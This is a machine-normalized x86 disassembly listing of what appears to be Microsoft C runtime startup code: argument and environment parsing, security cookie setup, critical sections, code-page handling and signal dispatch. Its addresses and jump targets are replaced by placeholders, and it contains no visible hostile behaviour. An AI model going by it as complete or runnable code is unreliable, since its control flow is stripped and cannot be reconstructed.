cmp ecx eax
jb r-xdata
xor ecx ecx
cmp [ ecx ] edi
je r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
mov edx [ ecx + 0x8 ]
test edx edx
je r-xdata
test ecx ecx
je r-xdata
cmp edx 0x5
jne r-xdata
cmp edx 0x1
jne r-xdata
and [ ecx + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] eax
cmp [ ecx + 0x4 ] 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
pop edi
push [ ecx + 0x4 ]
and [ ecx + 0x8 ] 0x0
call edx
push 0x24
pop edi
mov eax [ esi + 0x5c ]
add edi 0xc
and [ edi + eax - 0x4 ] 0x0
cmp edi 0x90
jl r-xdata
cmp [ ecx ] 0xc000008e
mov edi [ esi + 0x64 ]
jne r-xdata
cmp [ ecx ] 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp [ ecx ] 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp [ ecx ] 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
or eax 0xffffffff
pop ebx
jmp r-xdata
cmp [ ecx ] 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp [ ecx ] 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp [ ecx ] 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp [ ecx ] 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp [ ecx ] 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_414e56
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
push 0x104
mov ebx rw-data
push ebx
xor eax eax
xor edi edi
push edi
mov [ rw-data ] ax
call [ GetModuleFileNameW@IAT ]
mov esi [ rw-data ]
mov [ rw-data ] ebx
test esi esi
je r-xdata
mov esi ebx
cmp [ esi ] di
jne r-xdata
or eax 0xffffffff
mov eax [ ebp - 0x8 ]
cmp eax 0x7fffffff
jae r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
push edi
push esi
call sub_414f02
mov ebx [ ebp - 0x4 ]
add esp 0x14
cmp ebx 0x3fffffff
jae r-xdata
lea ecx [ eax + ebx * 2 ]
add ecx ecx
add eax eax
cmp ecx eax
jb r-xdata
push ecx
call sub_412014
mov edi eax
pop ecx
test edi edi
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ edi + ebx * 4 ]
push eax
push edi
push esi
call sub_414f02
mov eax [ ebp - 0x4 ]
add esp 0x14
dec eax
mov [ rw-data ] eax
mov [ rw-data ] edi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_414f02
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x18 ]
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebx ] edi
mov [ eax ] 0x1
test esi esi
je r-xdata
mov [ ebp + 0x8 ] 0x20
mov [ ebp - 0x4 ] 0x9
mov [ esi ] edx
add esi 0x4
mov [ ebp + 0xc ] esi
inc [ ebx ]
test edx edx
je r-xdata
xor eax eax
test edi edi
sete al
push 0x22
add ecx 0x2
mov edi eax
pop eax
jmp r-xdata
movzx eax [ ecx ]
add ecx 0x2
test ax ax
je r-xdata
mov ax [ ecx ]
mov [ edx ] ax
add edx 0x2
test edi edi
jne r-xdata
sub ecx 0x2
push 0x22
pop eax
cmp [ ecx ] ax
jne r-xdata
cmp ax [ ebp + 0x8 ]
je r-xdata
test esi esi
je r-xdata
movzx eax [ ecx ]
cmp ax [ ebp + 0x8 ]
je r-xdata
test edx edx
je r-xdata
cmp ax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp + 0x14 ]
pop edi
inc [ eax ]
pop esi
pop ebx
leave
retn
mov [ esi ] ebx
add ecx 0x2
jmp r-xdata
cmp ax [ ebp - 0x4 ]
jne r-xdata
mov edi [ ebp + 0x18 ]
xor ebx ebx
mov [ ebp - 0x8 ] ebx
xor eax eax
mov [ edx - 0x2 ] ax
jmp r-xdata
cmp [ ecx ] bx
je r-xdata
test esi esi
je r-xdata
mov eax [ ebp + 0x14 ]
mov esi [ ebp - 0x8 ]
inc [ eax ]
mov [ esi ] edx
add esi 0x4
mov [ ebp + 0xc ] esi
cmp [ ecx ] ax
je r-xdata
add ecx 0x2
inc ebx
push 0x22
pop eax
cmp [ ecx ] ax
push 0x5c
pop eax
jne r-xdata
test ebx ebx
jne r-xdata
test bl 0x1
jne r-xdata
dec ebx
test edx edx
je r-xdata
movzx eax [ ecx ]
test ax ax
je r-xdata
shr ebx 0x1
jmp r-xdata
test esi esi
je r-xdata
inc [ edi ]
mov [ edx ] ax
add edx 0x2
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
test edx edx
je r-xdata
test esi esi
jne r-xdata
and [ ebp - 0x8 ] 0x0
xor eax eax
test esi esi
sete al
mov esi eax
push 0x22
pop edi
cmp [ ecx + 0x2 ] di
mov edi [ ebp + 0x18 ]
jne r-xdata
inc [ edi ]
xor ebx ebx
jmp r-xdata
xor eax eax
mov [ edx ] ax
add edx 0x2
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp ax [ ebp + 0x8 ]
je r-xdata
add ecx 0x2
jmp r-xdata
cmp [ ecx ] bx
je r-xdata
add ecx 0x2
xor ebx ebx
jmp r-xdata
test edx edx
je r-xdata
cmp ax [ ebp - 0x4 ]
je r-xdata
push 0x5c
pop eax
push 0x5c
mov [ ebp - 0x8 ] 0x1
pop eax
jmp r-xdata
inc [ edi ]
mov [ edx ] ax
add edx 0x2
sub_41508f
push ebx
push esi
mov esi [ rw-data ]
xor ebx ebx
push edi
mov edi ebx
test esi esi
jne r-xdata
movzx eax [ esi ]
push 0x3d
pop ecx
test ax ax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ax cx
je r-xdata
lea eax [ edi + 0x1 ]
push 0x4
push eax
call sub_411fca
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
push esi
call sub_4163cb
lea esi [ esi + eax * 2 ]
pop ecx
add esi 0x2
inc edi
mov esi [ rw-data ]
cmp [ esi ] bx
je r-xdata
push esi
call sub_40f691
mov [ rw-data ] ebx
mov [ edi ] ebx
mov [ rw-data ] 0x1
xor eax eax
push esi
call sub_4163cb
pop ecx
push 0x3d
lea ebx [ eax + 0x1 ]
pop eax
cmp [ esi ] ax
je r-xdata
lea esi [ esi + ebx * 2 ]
xor ebx ebx
cmp [ esi ] bx
jne r-xdata
push 0x2
push ebx
call sub_411fca
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
mov esi [ rw-data ]
push [ rw-data ]
call sub_40f691
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_40fe10
add esp 0xc
test eax eax
jne r-xdata
pop ecx
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_4117ae
int3
add edi 0x4
sub_41517e
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
js r-xdata
call sub_410eb4
mov [ eax ] 0x16
call sub_41179e
or eax 0xffffffff
pop ebp
retn
cmp eax 0x2
jle r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] eax
cmp eax 0x3
jne r-xdata
mov ecx [ rw-data ]
jmp r-xdata
mov eax ecx
pop ebp
retn
sub_4151be
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
push esi
push edi
mov edi 0xbb40e64e
mov esi 0xffff0000
cmp eax edi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov eax [ ebp - 0x8 ]
xor eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
call [ GetCurrentThreadId@IAT ]
xor [ ebp - 0x4 ] eax
call [ GetCurrentProcessId@IAT ]
xor [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov ecx [ ebp - 0x10 ]
xor ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x4 ]
xor ecx [ ebp - 0x4 ]
xor ecx eax
cmp ecx edi
jne r-xdata
test esi eax
je r-xdata
test esi ecx
jne r-xdata
mov ecx 0xbb40e64f
jmp r-xdata
not eax
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] ecx
not ecx
mov [ rw-data ] ecx
mov eax ecx
or eax 0x4711
shl eax 0x10
or ecx eax
pop edi
pop esi
leave
retn
sub_415258
push esi
push edi
mov esi r--data
mov edi r--data
jmp r-xdata
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
add esi 0x4
call eax
sub_415278
push esi
push edi
mov esi r--data
mov edi r--data
jmp r-xdata
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
add esi 0x4
call eax
sub_415298
push ebp
mov ebp esp
push ecx
push edi
call [ GetEnvironmentStringsW@IAT ]
mov edi eax
test edi edi
je r-xdata
pop edi
leave
retn
push ebx
xor ebx ebx
push esi
mov esi edi
cmp [ edi ] bx
je r-xdata
sub esi edi
add esi 0x2
push esi
call sub_412014
pop ecx
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
add esi 0x2
cmp [ esi ] bx
jne r-xdata
push edi
call [ FreeEnvironmentStringsW@IAT ]
pop esi
mov eax ebx
pop ebx
push esi
push edi
push eax
call sub_412c10
mov ebx [ ebp - 0x4 ]
add esp 0xc
add esi 0x2
cmp [ esi ] bx
jne r-xdata
sub_41534f
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsSetValue@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_415371
push ebp
mov ebp esp
sub esp 0x44
lea eax [ ebp - 0x44 ]
push eax
call [ GetStartupInfoW@IAT ]
test [ ebp - 0x18 ] 0x1
je r-xdata
push 0xa
pop eax
leave
retn
movzx eax [ ebp - 0x14 ]
leave
retn
sub_415392
push ebp
mov ebp esp
push ecx
push esi
mov esi [ rw-data ]
test esi esi
jns r-xdata
xor eax eax
test esi esi
setg al
pop esi
leave
retn
mov eax [ rw-data ]
xor esi esi
xor eax [ rw-data ]
mov [ ebp - 0x4 ] esi
je r-xdata
mov [ rw-data ] esi
push esi
lea ecx [ ebp - 0x4 ]
push ecx
call eax
cmp eax 0x7a
jne r-xdata
inc esi
sub_4153d0
push esi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ GetProcAddress@IAT ]
mov edi eax
push r--data
push edi
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
mov [ rw-data ] eax
push r--data
push edi
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
pop edi
mov [ rw-data ] eax
pop esi
retn
sub_415648
mov ecx [ rw-data ]
xor edx edx
test ecx ecx
jne r-xdata
push esi
push 0x20
pop esi
mov ecx r--data
cmp eax 0x22
jne r-xdata
test ax ax
je r-xdata
add ecx 0x2
jmp r-xdata
xor eax eax
test edx edx
sete al
mov edx eax
mov eax ecx
pop esi
retn
test edx edx
je r-xdata
movzx eax [ ecx ]
cmp ax si
ja r-xdata
movzx eax [ ecx ]
test ax ax
jne r-xdata
cmp ax si
ja r-xdata
add ecx 0x2
sub_41569d
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi * 8 + rw-data ] 0x0
jne r-xdata
push [ esi * 8 + rw-data ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push esi
call sub_415725
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_411048
sub_4156d1
push esi
push edi
mov esi rw-data
mov edi esi
push ebx
add edi 0x8
cmp edi rw-data
jl r-xdata
cmp [ edi + 0x4 ] 0x1
je r-xdata
mov ebx [ edi ]
test ebx ebx
je r-xdata
pop ebx
push ebx
call [ DeleteCriticalSection@IAT ]
push ebx
call sub_40f691
and [ edi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
pop edi
pop esi
retn
push [ esi ]
call [ DeleteCriticalSection@IAT ]
sub_415725
push 0x8
push r--data
call sub_411a70
cmp [ rw-data ] 0x0
jne r-xdata
mov edi [ ebp + 0x8 ]
cmp [ edi * 8 + rw-data ] 0x0
jne r-xdata
call sub_4112f2
push 0x1e
call sub_41134f
push 0xff
call sub_411032
xor eax eax
inc eax
push 0x18
call sub_412014
pop ecx
mov esi eax
test esi esi
jne r-xdata
push 0xa
call sub_41569d
pop ecx
and [ ebp - 0x4 ] 0x0
cmp [ edi * 8 + rw-data ] 0x0
jne r-xdata
call sub_410eb4
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
push esi
call sub_40f691
pop ecx
push 0xfa0
push esi
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ edi * 8 + rw-data ] esi
jmp r-xdata
call sub_411ab5
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4157c3
sub_4157cc
push esi
push edi
mov esi rw-data
mov edi rw-data
add esi 0x8
cmp esi rw-data
jl r-xdata
mov [ esi ] edi
push 0xfa0
push [ esi ]
add edi 0x18
call [ InitializeCriticalSectionAndSpinCount@IAT ]
cmp [ esi + 0x4 ] 0x1
jne r-xdata
xor eax eax
pop edi
inc eax
pop esi
retn
sub_415820
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ecx [ eax + 0x3c ]
add ecx eax
push esi
movzx eax [ ecx + 0x14 ]
movzx ebx [ ecx + 0x6 ]
add eax 0x18
xor edx edx
add eax ecx
push edi
test ebx ebx
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx ebx
jb r-xdata
mov ecx [ eax + 0x8 ]
add ecx esi
cmp edi ecx
jb r-xdata
mov esi [ eax + 0xc ]
cmp edi esi
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_415870
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_411ad0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_415930
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_415820
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415930
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx 0x5a4d
cmp [ eax ] cx
je r-xdata
mov ecx [ eax + 0x3c ]
add ecx eax
xor eax eax
cmp [ ecx ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
pop ebp
retn
mov edx 0x10b
cmp [ ecx + 0x18 ] dx
sete al
sub_415a46
push 0x24
push r--data
call sub_411a70
xor ebx ebx
mov [ ebp - 0x20 ] ebx
xor edi edi
mov [ ebp - 0x28 ] edi
mov esi [ ebp + 0x8 ]
cmp esi 0xb
jg r-xdata
mov eax esi
sub eax 0xf
je r-xdata
je r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_414af7
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax esi
push 0x2
pop ecx
sub eax ecx
je r-xdata
xor eax eax
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
push esi
call sub_415bfb
pop ecx
pop ecx
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax [ eax ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
test ebx ebx
je r-xdata
push 0x3
call sub_411113
xor ebx ebx
inc ebx
mov [ ebp - 0x20 ] ebx
push eax
call [ DecodePointer@IAT ]
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_410eb4
mov [ eax ] 0x16
call sub_41179e
jmp r-xdata
mov [ ebp - 0x24 ] eax
cmp eax 0x1
je r-xdata
call sub_411ab5
retn
sub eax ecx
je r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi 0x8
je r-xdata
push 0x0
call sub_41569d
pop ecx
sub eax ecx
jne r-xdata
mov eax [ edi + 0x60 ]
mov [ ebp - 0x30 ] eax
and [ edi + 0x60 ] 0x0
cmp esi 0x8
jne r-xdata
cmp esi 0xb
je r-xdata
push 0x0
call [ EncodePointer@IAT ]
mov ecx [ ebp - 0x1c ]
mov [ ecx ] eax
mov eax [ edi + 0x64 ]
mov [ ebp - 0x34 ] eax
mov [ edi + 0x64 ] 0x8c
cmp esi 0x4
jne r-xdata
push esi
call [ ebp - 0x24 ]
push [ edi + 0x64 ]
push esi
call [ ebp - 0x24 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov edx ecx
mov [ ebp - 0x2c ] edx
cmp esi 0x8
jne r-xdata
mov eax [ ebp - 0x30 ]
mov [ edi + 0x60 ] eax
cmp esi 0x8
jne r-xdata
cmp esi 0xb
je r-xdata
pop ecx
cmp esi 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_415bc1
cmp esi 0x8
jne r-xdata
mov ecx edx
imul ecx ecx 0xc
mov eax [ edi + 0x5c ]
and [ ecx + eax + 0x8 ] 0x0
inc edx
mov [ ebp - 0x2c ] edx
mov ecx [ r--data ]
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov [ edi + 0x64 ] eax
cmp esi 0x4
jne r-xdata
mov eax [ r--data ]
add eax ecx
cmp edx eax
jge r-xdata
sub_415bfb
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ r--data ]
push esi
mov esi [ ebp + 0x8 ]
imul edx edx 0xc
add edx [ ebp + 0xc ]
cmp ecx edx
jae r-xdata
mov eax edx
imul eax eax 0xc
add eax [ ebp + 0xc ]
add ecx 0xc
cmp ecx eax
jb r-xdata
xor eax eax
cmp [ ecx + 0x4 ] esi
jne r-xdata
cmp [ ecx + 0x4 ] esi
je r-xdata
mov eax ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_415c55
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub eax 0x3a4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0x4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0xd
je r-xdata
mov eax [ r--data ]
pop ebp
retn
dec eax
je r-xdata
mov eax [ r--data ]
pop ebp
retn
xor eax eax
pop ebp
retn
sub_415c8f
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push 0x0
call sub_411f0f
mov eax [ ebp + 0x8 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
jmp r-xdata
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov [ rw-data ] 0x1
mov eax [ eax + 0x4 ]
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_415cfb
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x101
xor edi edi
lea esi [ ebx + 0x18 ]
push edi
push esi
call sub_412270
xor eax eax
movzx ecx ax
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] edi
mov [ ebx + 0x21c ] edi
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov edi rw-data
add esp 0xc
sub edi ebx
mov ecx 0x101
mov al [ edi + esi ]
mov [ esi ] al
inc esi
dec ecx
jne r-xdata
lea ecx [ ebx + 0x119 ]
mov edx 0x100
mov al [ ecx + edi ]
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_415d64
push ebp
mov ebp esp
sub esp 0x520
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
xor ebx ebx
mov edi 0x100
test eax eax
je r-xdata
push 0xffffff9f
lea edx [ esi + 0x119 ]
pop eax
sub eax edx
mov ecx ebx
mov [ ebp - 0x520 ] eax
mov eax ebx
cmp [ ebp - 0x51c ] 0x19
ja r-xdata
or [ esi + ecx + 0x19 ] 0x10
lea eax [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
lea ecx [ ebp - 0x512 ]
jmp r-xdata
mov [ edx ] bl
or [ esi + ecx + 0x19 ] 0x20
lea eax [ ecx - 0x20 ]
mov [ edx ] al
jmp r-xdata
test al al
jne r-xdata
add edx ecx
add eax edx
mov [ ebp - 0x51c ] eax
add eax 0x20
cmp eax 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40f682
leave
retn
mov eax [ ebp - 0x520 ]
inc ecx
lea edx [ esi + 0x119 ]
cmp ecx edi
jb r-xdata
movzx edx [ ecx + 0x1 ]
movzx eax al
jmp r-xdata
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x504 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push ebx
call sub_41866f
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0x21c ]
push ebx
call sub_41853f
add esp 0x40
lea eax [ ebp - 0x304 ]
push ebx
push [ esi + 0x4 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0x21c ]
push ebx
call sub_41853f
add esp 0x24
mov ecx ebx
cmp eax edx
jbe r-xdata
test al 0x2
je r-xdata
or [ esi + ecx + 0x19 ] 0x10
mov al [ ebp + ecx - 0x204 ]
jmp r-xdata
cmp eax edi
jae r-xdata
add ecx 0x2
mov al [ ecx ]
mov [ esi + ecx + 0x119 ] bl
or [ esi + ecx + 0x19 ] 0x20
mov al [ ebp + ecx - 0x304 ]
mov [ esi + ecx + 0x119 ] al
jmp r-xdata
mov [ ebp + eax - 0x104 ] 0x20
inc eax
movzx eax [ ebp + ecx * 2 - 0x504 ]
test al 0x1
je r-xdata
jmp r-xdata
inc ecx
cmp ecx edi
jb r-xdata
sub_415ef2
push 0xc
push r--data
call sub_411a70
call sub_414adf
mov edi eax
mov ecx [ rw-data ]
test [ edi + 0x70 ] ecx
je r-xdata
push 0xd
call sub_41569d
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_415f8e
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_411ab5
retn
push 0x20
call sub_411048
cmp esi rw-data
je r-xdata
push esi
call sub_40f691
pop ecx
sub_415f97
push 0x10
push r--data
call sub_411a70
or edi 0xffffffff
call sub_414adf
mov ebx eax
mov [ ebp - 0x1c ] ebx
call sub_415ef2
mov esi [ ebx + 0x68 ]
push [ ebp + 0x8 ]
call sub_415c8f
pop ecx
mov [ ebp + 0x8 ] eax
cmp eax [ esi + 0x4 ]
je r-xdata
xor edi edi
push 0x220
call sub_412014
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
call sub_411ab5
retn
mov ecx 0x88
mov eax [ ebp - 0x1c ]
mov esi [ eax + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
xor esi esi
mov [ ebx ] esi
push ebx
push [ ebp + 0x8 ]
call sub_416145
pop ecx
pop ecx
mov edi eax
mov [ ebp + 0x8 ] edi
test edi edi
jne r-xdata
cmp edi 0xffffffff
jne r-xdata
mov eax [ ebp - 0x1c ]
push [ eax + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
mov eax [ ebp - 0x1c ]
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ eax + 0x68 ] ebx
push ebx
call [ InterlockedIncrement@IAT ]
mov eax [ ebp - 0x1c ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov ecx [ eax + 0x68 ]
cmp ecx rw-data
je r-xdata
call sub_410eb4
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_40f691
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push ecx
call sub_40f691
pop ecx
mov eax [ ebp - 0x1c ]
push 0xd
call sub_41569d
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x21c ]
mov [ rw-data ] eax
mov ecx esi
mov ecx esi
mov ax [ ebx + ecx * 2 + 0xc ]
mov [ ecx * 2 + rw-data ] ax
inc ecx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi 0x100
jge r-xdata
mov al [ ecx + ebx + 0x18 ]
mov [ ecx + rw-data ] al
inc ecx
jmp r-xdata
mov [ ebp - 0x20 ] ecx
cmp ecx 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov al [ esi + ebx + 0x119 ]
